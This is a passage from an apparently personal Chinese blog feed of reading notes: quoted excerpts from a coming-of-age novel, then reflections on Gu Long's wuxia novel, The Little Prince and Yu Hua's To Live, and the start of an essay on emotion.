我们一起扑上去看，果然是一等奖。我当时毫不怀疑，我这辈子都挣不到五百元钱。”</p><p>“张国栋从骨子里瞧不上他，觉得象他这样一个面白无须，爱打小报告，好色却绝对作风严谨的人应该生活在那个太监属于正当职业的年代。”</p><p>“张国栋跟我讲过，三楼男生厕所第二个蹲坑的门上有两行字：“到哈佛读书，做朱裳老公。”</p><p>　　张国栋说：“咱们班长理想远大。我认得他的字。俗甜。”</p><p>　　“你的理想呢？”我问。</p><p>　　“挣钱。还有 ……”</p><p>　　“什么?”</p><p>　　“如果我和咱们班长的理想都实现了，我就尽全力让他戴绿帽子。开了奔驰600到他家楼下，用手机和朱裳叙旧。不急不燥，慢慢地聊。”</p><p>“大地一片静寂，除了我的呼吸和朱裳的心跳。一定要绿化了他，让他绿透了心，让他绿得萎而不举、举而不硬、硬而不坚、坚而不久、久而不射、射而不能育。”</p><p>“被迫满大街找电线杆子，顺着上面的广告钻胡同找老军医，最后受骗上当，一针下去再也抬不起头。然后和他的女儿混熟，去迪厅、歌厅、饭店、酒吧……见尽物欲横流，让她一回家就觉得家里憋气，看见她爸就憋气，有空就质问朱裳‘您为什么让这个人成了我爸爸？’……”<br>“</p><p>“但是对于我这种天赋好、后天训练又严格的厚脸皮没有多少效果。”</p><p>“在翠儿面前，只有在翠儿面前，我停止思考，我的小弟弟替代我的大脑，全权主导我的行为。”</p><p>“我缩在我靠窗的座位里，人也懒懒的。望着烦躁的窗外的春，柳絮在飞。想起那句庸俗的宋词：“柳径春深，行到关情处。颦不语，意凭风絮，吹向郎边去。”<br>“</p><p>“朱裳在，有两、三里垂柳堤岸就够了。“行到关情处”便是走到动情处了。手不必碰，眼不必交，只需两个人慢慢走就好了。有些心思，想不清，分不明。就象这酿在春光中的柳絮。有些心思也不必说出口，也不必想清楚，好在有柳絮。柳絮会带着柳絮一样的心思到她的身边去的，让她一样地心乱、心烦，一样的不明白。<br>“</p><p>“我、张国栋、刘京伟的步子放慢，朱裳聊了几句，一脸的不高兴。平时，朱裳虽然不爱说话，但从没有把不快堆在脸上。</p><p>　　我停了下来。张小三后来说，他很少看见我的眼睛里充满这种凶狠躁戾之色”</p><p>“你也上医院去看看吧。”朱裳后来说，她搀住我的手当时碰到我的单衣，她记得我的单衣下面的肌肉坚硬如石。<br>“</p><p>“老流氓孔建国早讲过,秋水的心术正不了。”</p><p>“或许自己真是不行了，连“酒色”都不行了,还有什么行的呀？真是对不住老流氓孔建国的教诲。<br>“</p><p>“人的脊柱里有盏灯，一杯“二锅头”沿着脊背下去到脊柱的一半，那是人的真魂儿所在的地方,一团火焰就燃烧起来了。啤酒要柔的多，要几瓶，时间要更长，灯也点不了太亮，飘摇着，就象一盏破油灯。油灯里的世界与白天里的不一样，与无光的黑夜里的也不一样。世界更加真实而美丽。”</p><p>“我没怕过什么人，也没信过什么。但我相信我将来会富，会成为一个有钱人。是不是男人就不该真的爱上什么人？就该搂完抱完心里什么也不剩？这样才能睡得着，吃得香，说起话来才能不顾忌，干起事来才能特玩命，才特别特别地象个好男人？这样，对，这样，就有许多女孩来喜欢你，然后你在搂完抱完心里什么也不剩。难道喜欢就是因为你不能放开了去喜欢？真他妈的见鬼了，见大头鬼了。可是是不是真的爱上什么人不是由你定的，你妈的，到底谁定的？到底谁管？凭什么呀？凭什么要喜欢你？凭什么？凭什么？”我想大声喊，喊醒所有的人，包括这个楼上的，父母单位的，包括学校的同学、老师，包括老流氓孔建国朱裳妈妈的老相好，喊醒所有睡着了的人，让所有的人都知道，自己在鬼哭狼嚎，自己在鬼哭狼嚎地喜欢着一个姑娘。<br>“</p><p>“为什么现在不是一千年以前？作屠夫的如果胳膊粗,可以象樊哙一样挥舞着杀猪刀去取人首级。如果舌头长,可以周游列国搬弄是非。哪怕阳物伟岸，也可以插进车轮，定住马车，让武则天听到谣言招进宫去。即使现在是一百年前,也能把朱裳抢上山去。过去好啊，斗殴和强奸一样，都是生存手段，现在都要受法律制裁。</p><p>　　现在是现在，街上有“面的”，路灯会定时熄灭定时亮起。现在能干什么呢?</p><p>　　“我这回真的信了，我信了还不行吗？”我听进我自己的声音突然变小，变得轻柔：“如果这辈子我能娶到朱裳，就让她屋子里的灯亮了吧！亮了我就信了。”</p><p>　　“让灯亮了吧。”</p><p>　　“亮了吧！”</p><p>　　那盏灯突然亮了，一点道理没有地突然亮了，在我念第三遍咒语的时候亮了。</p><p>　　我一路小跑，躲进我的房间里。<br>“</p><p>“我和张国栋认为是她的诗才太盛，但是表达能力太差，郁积在胸，变成了胆囊结石和胆管结石。”</p><p>“代课语文老师仗着他的大脑袋，精通中国文人的传统绝技：牢骚与胡说八道”</p><p>“比如讲公子重耳时，至少要讲重耳的板肋与重瞳，板肋就是排骨中间没肉，连成一块。重瞳就是一只眼睛里有两个瞳仁，天生的四眼，很吓人。如果讲台下的女学生们听得入迷，双手托腮，腮帮子白里透红，语文老师还要讲起重耳像女人珍视她们乳房一样珍视他的板肋，时常抚摸，他逃亡的时候，有个国君趁他洗澡的时候偷看了一眼他的板肋，重耳隐忍退让，当时什么也没说，等得势当上晋国国君之后，找了个借口把那个国君干掉了”</p><p>“爱念书的几个人象往常一样，屁股和椅子紧紧地吸着，复习上课记的笔记：“陕西，手巾板儿朝后。山西，朝前……”</p><p>　　鼻孔黑黑的男生对着同桌的眉眼傻笑：摊上新来了批水洗布的裤子,裤形不错，想不想一同去看看?</p><p>　　几个臭小子绕着桌椅游走玩耍，互相拍打对方的身体以示友好：又过了一节课，你是否感觉幸福?<br>“</p><p>“还立志当采花大盗呢？扯淡。”我暗暗骂了自己一句。<br>“</p><p>“你说要是哥伦布有个数学老师，他能发现新大陆吗？不能细听，听多了许多欲望都会没的。不仅食欲，兴许连春梦都没得做了呢。”<br>“</p><p>“穷文富武。文人吃饱了先想的一定是抱姑娘而不是写文章。不过，这或许是请客的真实目的呢。””</p><p>“我忽然不想上下午的政治课了，天阴了起来，我想回我的房间去。<br>“</p><p>“桌子的右手是扇窗子，窗子里盛了四季的风景，花开花落，月圆月缺。桌子的左手是扇门，我走进来，反手锁上，世界就被锁在了外边。</p><p>　　点亮灯，喝一口茶，屋里的世界便会渐渐活起来。曹操会聊起杀人越货，谈笑生死，以及如何同袁绍一起，听房，轮奸别人的新媳妇。毛姆会教我他的人生道理，最主要的一条是不要带有才气的画家或是写诗的到家里来，他们吃饱以后一定会勾引你的老婆。受尽女人宠的柳永低声哼着他的《雨霖铃》，劳伦斯喃喃地讲生命是一程残酷无比的朝圣之旅。杜牧才叹了一声“相思入骨呀”，永远长不大的马克吐温便开始一遍遍教你玩儿时的种种把戏。<br>“</p><p>“有些问题太难懂，仿佛上学离开妈妈，仿佛将来要将性命托给另外一个女人，仿佛现在心里喜欢上一个姑娘。小屋子太小了，容得下两个人吗？屋里的天地太大了，那个姑娘会喜欢吗？””</p><p>“我坐在桌子前，世界和自己之间是一堵墙，墙和自己之间是一盏灯，灯和自己之间是一本书。书和自己之间，是隐隐约约的朱裳的影子。”</p><p>“看得见数学老师不停翕动，唾沫细珠乱蹦的嘴，但是听不见任何声音，教室静寂无声。看得见每个人脑袋里的血管和血管里的思想，但是无法判断是邪恶还是伪善”</p><p>“我醒来的时候，发现和我躺在一张床上的李白、柳永、杜牧之流正用阴冷而狠毒的眼神看着我，张张惨白的脸在防腐剂中浸泡了千年，显得空洞而没有意义。”</p><p>“大家富点了，钱怎么花呀?一是给自己花，有病看西医，没病看中医。”</p><p>“出去淫荡吧!康大叔说得好，包好!包好!画阴阳盂的人巨聪明，你瞧，一阴，一阳，一男一女，你中有我，我中有你。一边多的正是一方边少的。我看，人心里都有个空荡荡的洞，你怎么努力，踢球、打牌、毛片、自提，没有用，最多只能堵住半边。就象阴阳盂，男孩只有泡在女孩那儿，才能补齐那半边，才能真正实在，才能真正愉快。去吧!包好，包好。””</p><p>“再捅捅，这得自己来了，我也帮不上你。仿佛和尚讲的‘悟’，师傅说出大天去也没有用，还得自己想明白。””</p><p>“有时候想明白也没有用，事情不经就没法明白。”</p><p>“扯淡。即使有点感觉，又能怎么样呢？语文老师说：‘假如我的眼睛使你心跳，我就从你脸上移开我的目光；假如打桨激起了水波，就让我的小船离开你的岸边。’我和你不一样，我没有你挺。” 我又喝了一口酒。<br>“</p><p>“他怎么想起来的？”</p><p>　　“或许是长到时候了吧，和憋尿差不多。”</p><p>　　“或许是天热，气烦。””</p><p>“阳正在下沉，“为什么初生的与要下沉的总是很大？”红红的、圆圆的，仿佛某种永难愈合的伤口。”</p><p>“这是他的逻辑，不是我的逻辑，你知道我的，我没逻辑。”</p><p>“你真仗义，如果没有‘然后’的话？”</p><p>　　“然后咱俩把位子换过来。”</p><p>　　“不干。”</p><p>　　“只换半年。”</p><p>　　“免谈。不干。””</p><p>“好吧，你等好吧。我知道你瞧不上我，一入校你就让我难看，你们都看不上我，我也会让你很难看的。””</p><p>“不再是楼群间的老路了”</p><p>“朱裳后来告诉我，她脑子里浮现出那个很丑很丑的布娃娃，以及把娃娃剪成碎片的剪刀，没有继续想，重重地关上了门，转身靠在门框上，泪如泉涌。”</p><p>“我在朱裳关门的一瞬间，瞥见她身后，阳台上，她白地粉花的内裤随风飘摇。”</p><p>“我尤其喜欢评论的最后一段，感觉自己象是巫师，具备了盅惑人心的超能力。”</p><p>“　　最不喜欢一个人吃饭。在赶小说的过程中偶尔和几个小说中的原型吃饭，最后都是对着窗外的冬天，喝一口燕京纯生，感叹“人生苦短，还是喜欢干点什么就趁早干点什么”</p><p>“灯市口大街北边有个打折书店，新书堆着卖，跟冬储大白菜似的，汗牛冲栋，从地板一直瘀到屋顶，王小波的全套四大本文集才卖二十元。当时一个恍惚，如五雷轰顶，信心顿失，这里面多少垃圾呀？五百年后有多少书还有人读呀？在这种认识下，要多大的牛逼和多大的自大狂才能撅着屁股写成十几万字，然后印在干干净净的白纸上，糟践好些用来制造白纸的树木和花花草草。想起那个日本鬼才芥川龙之介，怀疑自己能力的时候就打开阁楼的窗户，向着虚空，大声叫喊：“我是天才。”最后还是没用，三十五岁服了安眠药死掉。”</p><p>“桃花落尽子满枝”，过去操场上领操的校花，如今正考虑什么时候破坏国家政策生第二胎，要不要自己开个幼儿园。何苦打着记录生命经验的旗号，再意淫人家一遍？”</p><p>“于是热烈地盼望再有几个长假，把我不能不落在纸上的东西写完。写完了，心里面就该空荡荡的什么都没有了吧？再见老相好也能心如古井水，没有一丝波澜。于是热烈地盼望着没有写作冲动的那一天，然后就号称自己尘务经心，天分有限，一个字也不写了，就像热烈地盼望着阳痿的到来。</p><p>　　野史说，江淹才尽后，过着吃喝嫖赌抽坑蒙拐骗偷的幸福生活。我愿意相信。”</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《多情剑客无情剑》</title>
      <link href="/mind/160825WeaponAndWoman/"/>
      <url>/mind/160825WeaponAndWoman/</url>
      
        <content type="html"><![CDATA[<p>﻿这是我人生中第一本武侠小说，据说这也是古龙先生的巅峰之作，只因为在知乎上有人提到看古龙先生的作品千万别从《多情剑客无情剑》看起，因为曾经沧海难为水，再看其他的就显得干燥无味了，于是，便有了这一篇读后感。</p><p>“冷风如刀，以大地为砧板，视众生为鱼肉。万里飞雪，将苍穹作烘炉，溶万物为白银。”冷风，飞雪是大地上苍穹下恒久的寂寞，众生，万物皆被寂寞宰杀，犹如鱼肉之于刀俎，无可奈何，不曾停歇。长文以此为始，我猜想这定是个骨子里透着悲伤的人在说一个悲伤的故事，故事里有一个寂寞的主角，在苍茫大地上漂泊，用生命诠释着寂寞。<br>“世上太多烦恼，岂非是因为笑得太少？笑，就像是香水，不但能令自己芬芳，也能令别人快乐。你若令别人一笑，纵然做做愚蠢的是又何妨？”直到看到了文章的结尾，才知寂寞因真情而起，却也终因真情而得以排解。</p><p>小李探花李寻欢十数年前抛弃所爱之人，故乡，名利，出关漂泊，只留下鼎鼎大名在关中流传——“小李飞刀，例不虚发”。他舍弃了自己的本心，情愿自我折磨以成全好友龙啸云对林诗音的爱，这是古龙先生对他的大侠设定，我也因此对之有所钦佩，只是令我疑惑的是，时隔多年，林诗音与龙啸云已然成家生子，美满和谐，李寻欢归来，竟不怕徒生波折，多年苦心付诸东流？掩卷思之，唉，毕竟凡人。一走了之自然干脆利落，只是后来，痛苦从没停止。他可以成全重义轻色作为侠客的自己，却始终无法抹煞灵魂深处对于林诗音不曾停过的思念。十多年来，每一刀所刻画出的她脸庞上的线条，每一个刻成的眉眼熟悉的她，每一个埋下的她，都是他试图淡忘的努力，只是有些女人就像长在男人心底的朱砂痣，时间越久，盛开得越是红火，越是鲜艳，比如，李寻欢心中的林诗音，又或者，自己心中的那个她。我相信爱情能让人忘记时间，但是深情如他，时间，即便是十年之久的光阴，都无法让他忘掉哪怕一点点的细节，她在他的心中，在他的刀下，只是越来越清晰，越来越和那个青梅竹马的女孩重合。</p><p>每当我想着那样一把随时可能悄无声息的以迅雷不及掩耳之速射出，没入喉管，饮满鲜血的冰冷的刀，在一个历经折磨，沧桑却不改深情的男人手中一点点勾勒出他最爱的女人的模样时，许多情绪便接连涌出，感动，无奈，悲伤，厌恶，嘲讽……他们形状各异，却各有缘由，细看之下每一样都能让我透不过气，每一项都在折射着作为人的悲哀。</p><p>李寻欢啊，你爱的是林诗音吗？还是其他的什么？你是真的爱吗？你说是，那为什么会有当初的放弃呢？呵呵，你只替自己想过吧。爱情可以转让吗？合适吗？值得吗？过去也都罢了，那么如今呢，归来何用？怎就看不破。</p><p>其实也不怪你，你太寂寞了。这样一个不犯佳人，不负美酒的有能耐的男人，这样一个天下敬仰，才情横溢的有魅力的男人，这样一个少年成名，义薄云天的有质量的男人，自然需要些不可自拔的东西来消费自己，耗散人生，比如深情，比如幻想。</p><p>后来有了小红，于是幻想放在一旁，随她去吧。毕竟过去的已经过去了。这是多么深刻的真理啊，足以慰藉这十年一梦的荒唐了。</p><p>自然，你是小李飞刀，你可以为随便一个你以为可以是兄弟的人放弃，销毁一个你深爱也爱你不浅的女人和她的豆蔻年华，甚至她的漫漫人生，你可以亲手舍弃真心而沉浸在十年一日的自我折磨中，你可以情不自禁地归来，无辜任性地破坏，自作自受的痛苦，我不适，我不悦，但我不怪，因为我知道，这不只是因为你是小李飞刀，更因为你首先是一个人。感情之于人，就是这样的虚伪和荒唐，矛盾与悲哀。</p><p>剑客是人，剑是人生，多情的人，无情的人生啊！</p><p>阿飞，阿飞，你终于还是成了李寻欢，你比他有过之而无不及。或许，你不该遇上他的。</p><p>你本是纵横荒野，睥睨天地的万兽之王，只是如今，竟也被这鲜美皮囊，花言巧语，假意虚行困在牢笼里。我不怪林仙儿，她或许淫荡，或许邪恶，但也或许，或许真的爱你。只是恨你，你怎就动了爱的念头呢？你喝不起酒，难道自觉地爱得起吗？你看，忘了当初了吧。回头看，你曾是多么的睿智和明白啊。如今呢，你简直已被毁了。我为你感到心痛，但也明白，你若没这一遭，大概人生也显得有些无趣了。前面那些年的痛苦和煎熬，没了后面的堕落与荒谬，倒也显得苍白无用了。</p><p>这几日，阿飞数院里梅花的场景常常浮现在我脑海里，说实话，我是有些羡慕的。虽然我没有那么快的剑，没有那样敏锐的身体和大脑，没有冰天雪地般恶劣的成长环境，没有享受过林仙儿般的温存，没有体验过，透入骨髓的寂寞，但是我也有浪荡江湖的渴望，偶遇佳人的企盼，长相厮守的梦想，还有，还有，执迷不悟的少年心。</p><p>我为阿飞扼腕，并假想如果我是他，我一定能够敏感地一早识破林仙儿的谁都可以，流氓般地可以了那谁都可以的林仙儿，然后抛弃她，找回自己，再然后，仗剑天涯，让世人都惊畏那把像玩具的刀。我为李寻欢叹息，并假想如果我是他，一定不会让龙啸云和林诗音升温，更不可能让步远走，因为那是我爱的，无论是谁，什么理由，都不可能拿走，更何况，我是李寻欢，例不虚发的小李飞刀。我会爱她，好好爱，用全部爱，会陪她看每一年的红梅，而不是守着红梅想她如今的样子。</p><p>我想的很好，很周到，独独忘了一点，我不是阿飞，我不是李寻欢，而且，如果我成了他们，他们也就不再是他们了。</p><p>无论是阿飞，还是小李探花，他们都是大侠，有着大侠的格局，而我只是个小人物，死守着小人物应有的格局。在我的生活里，没有动辄夺命的强大，只有任人鱼肉的弱小，没有仗剑独行的潇洒，只有乌合于众的无奈，没有挥霍一切的资本，只有救赎不完的责任。我看着自己在这十丈软红里醉生梦死，想要呼喊，想要咆哮，却发不出什么声音。</p><p>虽然对这一切感到绝望，但是至少，我还能够想热爱便热爱，想受伤便受伤，也算是生活给的最后的出路吧。  </p><p>读些武侠，算是对这生存以上生活以下的现状的一丝反抗吧。看那些故事里的人在岁月中进进出出，笑笑哭哭，我也能佯装通透地陪着叹声“梦中不知身是客，一晌贪欢”。<br>无论如何，我希望阿飞，李寻欢，或者我自己，都能找到自己，活好一次。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《小王子》</title>
      <link href="/mind/160806Prince/"/>
      <url>/mind/160806Prince/</url>
      
        <content type="html"><![CDATA[<h3 id="小王子终要长大"><a href="#小王子终要长大" class="headerlink" title="小王子终要长大"></a>小王子终要长大</h3><p>素闻大名，今日得见，这童话，确只有大人能读懂。悲哀的是，看懂的大人们只能苦笑，醒悟过来了却立马又为醒悟本身觉得不好意思，骚情一些的还会感到失落无奈呢，好比秒懂黄色笑话带来的尴尬，所幸四下无人，我也便笑笑不说话。</p><p>故事背景预设颇为离奇，亦真亦幻，主人公遇见小王子，然后转述小王子对他说的故事，于是，鞭笞大人们的皮鞭开始一下一下地落下去。</p><p>小王子来自异星球，有一朵傲娇的花，两座可以做饭的活火山，一座可以当做座椅的死火山，火山们必须常常被清理，猴面包树的小苗子也是。然而小王子对一些无关紧要的话看的太认真，结果使自己很苦恼，也因此和心爱的花闹了别扭，于是他决定去拜访其他星球，找点事做，学习学习。以下是他依次拜访的行星。</p><p>第一个星球上有一个国王，热衷于荒唐的权利，发布着可笑的命令，自以为能令行天下，实则只是自然的傀儡，狐假虎威，无所作为，通过号称占有整个宇宙来获得快感却甚至从未视差走访过所谓的辖区，不知是否是我多虑，暗中所指恐怕政治性不当。</p><p>第二个星球上是一个爱虚荣的人，他的人生只看到虚无的荣耀，再无其他。</p><p>第三个，酒鬼，沉浸在回忆中无法自拔，为为喝酒而羞愧，为忘却羞愧而喝酒。</p><p>第四个，实业家，暗讽了资本家的荒谬，虚无的占有。</p><p>第五个，点灯人，对生活节奏加快的夸张表述和反思，对成为牺牲品的劳苦大众的尊敬和怜悯，对民智不开的无奈。在这里日子过得快，小王子爱的却是每小时1440次的落日。</p><p>第六个，地理学家，让我猜猜看，说的是学者的闭门造车，古板生硬吧，还妄图要写永恒的东西，那么小王子便问了，什么是短暂？</p><p>第七个，地球。蛇告诉他，在人群中你一样会孤独。三枚花瓣的小花说人类在风中飘来飘去，没有根是他们最大的不便。狐狸当了小三，和小王子谈了一场文艺青年之间的恋爱。扳道工说开车人也不知道要去哪里。卖止渴药的商人也蛮有意思。然后是分别，就好像剥落旧树皮一样，旧树皮并没有什么可悲的。</p><p>私以为，这样荒诞而模棱两可的文字最值得捉摸感慨，最是意味深长，也最可解释，因此最容易反映一个人内心的阴暗程度，一千个人有一千个黄色笑话，无怪乎闻名遐迩，只是其中用心，懂又如何，不懂又如何，微弱的呼唤并不足以阻挡时代轰隆隆滚动前进着的巨轮，毕竟开列车的人也不知道要去哪里，毕竟我也已经自测心里脏的很呢。所以，这时代，大可以出轨翻车，一了百了，停下是万万不能的，毕竟，远处还有孩子们想要的布娃娃呢。</p><p>附上摘抄:<br>《小王子》摘抄:<br>1.小孩子们对大人们应该宽厚些，不要埋怨他们。</p><p>2.忘记一个朋友，这太叫人悲伤了。并不是所有的人都有过一个朋友。</p><p>3.再说，我也可能变成那些大人那样，只对数字感兴趣。</p><p>4.我大概有点和大人们差不多。我一定是变老了。</p><p>5.有时候，人们把自己的工作推到以后去做，并没有什么妨害，但要遇到拔猴面包树苗这种事，那就非造成大灾难不可。</p><ol start="6"><li>“一天，我看见过四十三次日落。”过一会儿，你又说：“你知道，当人们感到非常苦闷时，总是喜欢日落的。”“一天四十三次，你怎么会这么苦闷？”小王子没有回答。</li></ol><p>7.“你说话就和那些大人一样！”这话使我有点难堪。可是他又尖刻无情地说道：“你什么都分不清…你把什么都混在一起！”</p><p>8.小王子对一些无关紧要的话看得太认真，结果使自己很苦恼。</p><p>9.“我那时什么也不懂！我应该根据她的行为，而不是根据她的话来判断她。她使我的生活芬芳多彩，我真不该离开她跑出来。我本应该猜出在她那令人爱怜的花招后面所隐藏的温情。花是多么自相矛盾！我当时太年青，还不懂得爱她。”</p><ol start="10"><li>“我要是想认识蝴蝶，经不起两三只尺蠖是不行的。</li></ol><p>11.国王接着说，“向每个人提出的要求应该是他们所能做到的。权威首先应该建立在理性的基础上。</p><p>12.一旦他提出了一个问题，是从来也不会放弃的。</p><p>13.地球可不是一颗普通的行星！它上面有一百一十一个国王（当然，没有漏掉黑人国王），七千个地理学家，九十万个实业家，七百五十万个酒鬼，三亿一千一百万个爱虚荣的人。</p><p>14.到了有人的地方，你一样孤独。蛇对小王子说。</p><p>15.花评价人，他们没有根，风吹着他们到处跑，这对他们是很不方便的。</p><p>16.“你们是什么人？”小王子问。“你们是什么人…你们是什么人…你们是什么人…”回音又回答道。“请你们做我的朋友吧，我很孤独。”他说。“我很孤独…我很孤独…我很孤独…”回音又回答着。小王子想道：“这颗行星真奇怪！它上面全是干巴巴的，而且又尖利又咸涩，人们一点想象力都没有。他们只是重复别人对他们说的话…在我的家乡，我有一<br>朵花。她总是自己先说话…</p><p>17.“我还以为我有一朵独一无二的花呢，我有的仅是一朵普通的花。这朵花，再加上三座只有我膝盖那么高的火山，而且其中一座还可能是永远熄灭了的，这一切不会使我成为一个了不起的王子…”于是，他躺在草丛中哭泣起来。</p><p>18.驯服就是建立联系。对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你。你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。但是，如果你驯服了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。”“我有点明白了。”小王子说，“有一朵花…，我想，她把我驯服了…”</p><p>19.驯服，仪式，都是早已被人忘却的事情了。</p><p>20.这就是你的过错，我本来并不想给你带来任何痛苦，可你却要我驯服你。</p><p>21.只有用心才能看见实质性的东西。用眼睛是看不见的。眼睛是什么也看不见的，应该用心去寻找。</p><p>22.你要对你驯服过的一切负责到底。</p><p>26.人们已经忘记了这个道理，可你不该忘记它。</p><p>27.你也渴吗？水对心也是有益处的。</p><p>28.是的，无论是房子，星星，或是沙漠，使它们美丽的东西是看不见的！”</p><p>29.我想起了狐狸的话，如果被人驯服了，就可能会要哭的……</p><p>30.我很高兴，你找到了你的机器所缺少的东西，很快你就可以回家去了。</p><p>31.这就好象我并没有给你星星，而是给你一大堆会笑出声来的小铃铛…”</p><p>32.但是，这就好像剥落的旧树皮一样。旧树皮，并没有什么可悲的。</p><p>33.这时，他也沉默了，因为他在哭。</p><p>34.那些人们啊，他们往快车里拥挤，但是他们却不知道要寻找什么。于是，他们就忙忙碌碌，来回转圈子…”小王子说道。他接着又说:“这没有必要…”</p><p>35.他们真匆忙呀，”小王子说，“他们要寻找什么？”“开机车的人自己也不知道。”扳道工说道。于是，第二列灯火通明的快车又朝着相反的方向轰隆轰隆地开过去。“他们怎么又回来了呢？”小王子问道。“他们不是原来那些人了。”扳道工说，“这是一次对开列车。”“他们不满意他们原来所住的地方吗？”“人们是从来也不会满意自己所在的地方的。”扳道工说。此时，第三趟灯火明亮的快车又隆隆而过。“他们是在追随第一批旅客吗？”小王子问道。“他们什么也不追随。”扳道工说，“他们在里面睡觉，或是在打哈欠。只有孩子们把鼻子贴在玻璃窗上往外看。”“只有孩子知道他们自己在寻找什么。”小王子说，“他们为一个布娃娃花费不少时间，这个布娃娃就成了很重要的东西，如果有人夺走的他们的布娃娃，他们就哭泣…”“他们真幸运。”扳道工说。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《活着》</title>
      <link href="/mind/160806Living/"/>
      <url>/mind/160806Living/</url>
      
        <content type="html"><![CDATA[<h3 id="指归夜话"><a href="#指归夜话" class="headerlink" title="指归夜话"></a>指归夜话</h3><p>乙未年丙戌月己巳日，晨起气虚，身疲心乱，惶惶然不知所之。远黛无言，吾凝眸自语，生而今六千四百日有余，竟不自知。吾常囿于心，或无名之哀，或自傲之觞，或悲怜之恸，或若失之沮，悉不得自已。情不意而卒起，辗转难消，弥而复兴，实不可脱。其必天使惘也，吾岂愿哉？日四食，麑裘葛衣，群居终日，言不及义，语不由心，周而复始，乐此不疲，此吾所见众人之态也，某异其司空见惯，无以为奇。</p><p>某少伶俐，敏于思而巧于言，且样貌清秀，向为乡党殊爱，亦备称大父修德之功。然吾不以为意，尽日悠游，不齿于众小儿斗鸡走狗之态。吾自况于天使，所忧所乐亦必在天地。久之，吾欲无言。忧之弥重，乐之益薄，是故吾常有不喜不忧亦喜亦忧之状，人以为怪，渐远之。某愈无言，自得其乐。天地体大，所忧甚于所乐者远矣，吾遂长忧寡乐，以至于今。吾不知生而何由，逝而何往，孑然蹒跚，草草何益。吾不忍强食弱肉，人为情缚，同室操戈，苍生刍狗。吾不解天地不仁，大道出否，民智不开，其可哀乎。吾不悦，吾不愿，吾不屈，吾不自欺，吾不语人，吾不畏穷，戚戚然乎吾不可奈何。及至祖考坐化，情状愈烈，昔忧发于心，此情伤乎神。某昼不言，夜不语，魂不宁，魄不居，寐中数觉，凭窗望月，千古万人，踽踽如斯。噫，何足叹兮？何足道兮？</p><p>某素闻《活着》系仁义之言，今幸拜读，深受其诲，奉为指归之作，遂欲秉烛夜话，发二三言，以消胸中块垒。</p><p>徐家有子，名唤福贵，因家境殷实，嫖赌成性，娶妻家珍，生女凤霞，育子有庆。其性随父，不务正业，好赌，负于龙二，败尽家财，房、地易主，遂家道中落，命途陡转。旋即其父作古，悲曲始奏。福贵租地自耕，聊以糊口，家奴辞尽，长根行乞。后因母病赴城求医，见征为壮丁，随军北上，九死一生，二三年间，战火纷飞，故土遥遥，生死不料。国军兵败，其为共军所虏，幸归故里，母已身故，未及送别，女病致哑，悲不自胜。幸家有脊梁，希望犹在。俄而有庆献血，枯涸而亡，父筑子坟，其可哀也。后王二喜妻凤霞，凤霞怀苦根，产后出血而亡，其母悲恸，不久卒命。苦根聪颖，香火得续，希望犹在。继而王二喜工伤弃世，家余老幼，福贵苦根，相依为命。居数年，苦根饱食豆子，腹胀而夭。此间之福贵，生无可恋，死无挂碍，希冀无存，心如死水。福贵后购一牛，亦谓福贵，两病残之躯，老而不亡，又享十数年寿。境遇如斯，恐无更甚，字字泣血，我心伤悲。<br> 人生天地间，犹白驹过隙，忽然而已。虽寿夭有别，贵贱不一，然则终期于尽，具归抔土。以是自问，生而何用？掩卷怅然，或得之矣，盖无用乎。生，人之所以生者；死，人之所以死者。死生虽大，亦应随化，生则不必远逐，知足而安；老则顺天应时，向死而生；死则鼓盆而歌，忘我如寐。吾实不知，如此足乎？</p><p>福贵之难，可谓时也，运也，命也。时逢新陈之交，改朝换代，上位易主，黎民食苦。运乃祸不单行，屋漏夜雨，一波三折，缘悭命蹇。吾不知命，且不妄言。此故事也，强言时、运不可怪也。吾曹苟欲鉴古为今，何其难也。当世之人鲜知当世之时，当事之人难断当事之运，况凡人不可悉命。故曰:吾属皆为时、运、命所虏，无一得脱，诚可哀也。使福贵举家赴死，于国有损乎？有益乎？吾等皆福贵之属也，于时势不可尽无，亦不必有，实神鬼之木偶，肉食者之脍具。</p><p>是故为人，实则为器，或问天下，或撷梨花，其何异之有？惟不失本心。福贵虽穷且困，不为非歹，知恩重义，纵死不辜。此其所以笑谈旧痛而无愧无伤，亦其妻所以死而瞑目也。吾知之也，人之于世，不求有为，但得无愧。</p><p>福贵已已，某值少年，不喜游荡，不好掘藏，乐作和尚，何为其然也？吾不知。吾且无言，且诗且酒趁年华，且行且赏且由他。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>关于情感</title>
      <link href="/mind/160606LoveAndLife/"/>
      <url>/mind/160606LoveAndLife/</url>
      
        <content type="html"><![CDATA[<h3 id="自古逢秋悲寂寥，我言年年有今朝"><a href="#自古逢秋悲寂寥，我言年年有今朝" class="headerlink" title="自古逢秋悲寂寥，我言年年有今朝"></a>自古逢秋悲寂寥，我言年年有今朝</h3><p>我总是怀疑，那些我们曾经或依然念念不忘的是否真的在某一日终有回响？</p><p>我想自己还是太过年轻，年轻到不足以谈论起情感这样一个宏大复杂的话题。但我也渐渐明白，一个人在每个人生阶段的想法对自己而言都是独一无二且至关重要的，无论这种想法回头看时会显得多么自以为是甚至荒唐可笑。实际上两个人没理由也没立场去互相褒贬指摘对方的想法，不同阶段的同一个人也是。不能两次踏进同一条河，也不能一次踏进两条河里，所谓醒来可能是另一个梦，所谓死去或许是回到故乡，所谓成长有些像是幻想，所谓理解大概只是妥协。当有天，你和从前的你四目相对，互不相识，你们谈论起理想与人生，幸福与意义，存在与追求，你们谈论的，好像不再是同一回事，于是，你们苦笑摇头，错身而过。在这之后的某个午夜忽然醒来后的一两个刹那里，你不知何时何地，再两个刹那，你就明白了自己究竟有多孤独。</p><p>从远古走来，人类一直孤独，也一直寻求解药，但并不能真正改变什么。深埋在简陋灵魂下的孤独基因并没有在红灯绿酒，歌舞升平的摩登时代里有丝毫消减，相反地，大有愈演愈烈的趋势。酒色财气，声色货利对当代人精神领域的鲸吞蚕食大大提高了人们对于快感刺激的阈值。我们越来越不能被满足，越来越挑剔和脆弱，表面快要溢出的热情无法掩盖内心滴水成冰的冷漠。真挚的感情渐渐成了对人生奢侈的期待，全球在一点点变冷。</p><p>情感大概有友情亲情和爱情，它们有所不同，但我没有足够的智慧来给出明确的界